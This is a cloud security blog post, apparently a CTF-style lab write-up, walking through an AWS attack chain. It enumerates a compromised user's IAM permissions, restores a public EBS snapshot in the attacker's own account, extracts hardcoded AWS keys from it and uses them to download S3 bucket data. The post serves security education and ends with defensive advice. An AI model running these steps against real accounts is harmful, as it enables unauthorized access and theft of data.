---
title: '100 Days of Cloud Security - Day 65: Cloud Security Journey'
date: '2026-01-14'
author: 'Venkata Pathuri'
excerpt: 'Day 65 of my cloud security journey - Cloud Security Journey'
tags: ['cloud-security', 'aws', '100days', 'cybersecurity']
---

# Day 65: Cloud Security Journey

## Overview
Welcome to Day 65 of our cloud security journey! Today, we delve into a critical scenario that highlights the importance of securing Elastic Block Store (EBS) snapshots in AWS. Building on the foundational concepts we explored in Day 64, where we discussed IAM policies and access control, we will now put those principles into action by learning how a compromised account can lead to severe data exposure through public EBS snapshots. This hands-on assessment will sharpen your skills in identifying vulnerabilities and understanding the repercussions of poor security practices.

## Learning Objectives
By the end of today's session, you will master the following:
- How to enumerate IAM permissions and analyze policies to understand potential risks.
- Techniques to identify public EBS snapshots and assess their security posture.
- Practical steps to exploit vulnerabilities by accessing sensitive information from compromised snapshots.
- Best practices for securing AWS resources and mitigating future risks.

## Deep Dive

### Phase 1: Enumeration (The Compromised Account)
To begin our assessment, we first need to understand the context of our compromised account. The user `intern` is equipped with limited permissions that we need to evaluate.

1. **Identify User Context**: The first step is to confirm our identity.
    ```
    aws sts get-caller-identity
    ```
   The output will indicate that we are logged in as `intern`, which is crucial for our next steps.

2. **Enumerate Permissions**: Next, we explore the IAM policies attached to our user.
    ```
    aws iam list-attached-user-policies --user-name intern
    ```
   The response shows that `intern` has the `PublicSnapper` policy attached, hinting at potential vulnerabilities.

3. **Analyze Policy Document**: To understand what actions are permitted, we fetch the policy details.
    ```
    aws iam get-policy --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper
    aws iam get-policy-version --policy-arn arn:aws:iam::104506445608:policy/PublicSnapper --version-id v9
    ```
   Key findings reveal permissions such as `ec2:DescribeSnapshots`, which allows the user to view all snapshots.

4. **Scan for Snapshots**: With the permissions understood, we list all EBS snapshots owned by the account.
    ```
    aws ec2 describe-snapshots --owner-ids 104506445608 --region us-east-1
    ```
   Here, we identify a public snapshot (`snap-0c0679098c7a4e636`) that may contain sensitive data.

5. **Verify Public Exposure**: Finally, we check if this snapshot is publicly accessible.
    ```
    aws ec2 describe-snapshot-attribute --attribute createVolumePermission --snapshot-id snap-0c0679098c7a4e636 --region us-east-1
    ```
   The result indicates that the snapshot is shared with "Group: All", confirming its public exposure.

### Phase 2: Exploitation (The Attacker's Account)
To exploit this vulnerability, we must proceed using our personal AWS account.

1. **Create a Volume from the Snapshot**: 
   - Log into your AWS Console and navigate to **EC2 > Snapshots > Public Snapshots**.
   - Search for the Snapshot ID `snap-0c0679098c7a4e636`.
   - Select "Create volume from snapshot" and ensure you specify an Availability Zone (e.g., `us-east-1a`).

2. **Launch an Investigation Instance**:
   - Launch a standard Ubuntu EC2 instance (e.g., `t2.micro`).
   - Ensure the Subnet matches the same Availability Zone as the volume created.

3. **Attach the Volume**:
   - Once the instance is running, go to **EC2 > Volumes**.
   - Select the restored volume, then **Actions** -> **Attach Volume**. Choose your instance (likely `/dev/sdf`).

### Phase 3: Looting & Pivoting
Now that we have the volume attached, we can explore the data.

1. **Mount the Filesystem**:
    ```bash
    ssh -i key.pem ubuntu@<IP_ADDRESS>
    lsblk
    mkdir disk
    sudo mount /dev/xvdf1 disk
    ```
   If `/dev/xvdf1` fails, try mounting the raw device `/dev/xvdf`.

2. **Hunt for Secrets**:
    ```bash
    cd disk/home/intern
    ls -R
    ```
   Among the files, locate `practice_files/s3_download_file.php`.

3. **Extract Hardcoded Credentials**:
    ```bash
    cat practice_files/s3_download_file.php
    ```
   Here, you may discover hardcoded AWS Access Key and Secret Key.

4. **Pivot to S3 (Post-Exploitation)**:
   - Install AWS CLI (if missing):
     ```bash
     sudo apt update && sudo apt install awscli -y
     ```
   - Configure CLI with the stolen keys (Region: `us-east-1`):
     ```bash
     aws configure
     ```
   - List and download data from the compromised S3 bucket:
     ```bash
     aws s3 ls s3://ecorp-client-data
     aws s3 cp s3://ecorp-client-data/ecorp_dr_logistics.csv .
     aws s3 cp s3://ecorp-client-data/flag.txt .
     ```

## Key Takeaways
Today, we navigated through a real-world exploitation scenario, demonstrating how a public EBS snapshot can lead to data breaches. We learned to enumerate permissions, identify public resources, and leverage vulnerabilities to access sensitive information. The insights gained today emphasize not only the technical skills required to identify and exploit vulnerabilities but also the critical importance of securing AWS resources against unauthorized access.

## Real-World Applications
The techniques and concepts covered today are paramount in any production environment. Organizations must prioritize securing their EBS snapshots and other AWS resources to prevent unauthorized access and potential data breaches. By implementing strict IAM policies, utilizing encryption, and adopting best practices for secrets management, businesses can safeguard their assets and mitigate risks in an increasingly complex cloud landscape.

---
**Journey Progress:** 65/100 Days Complete 🚀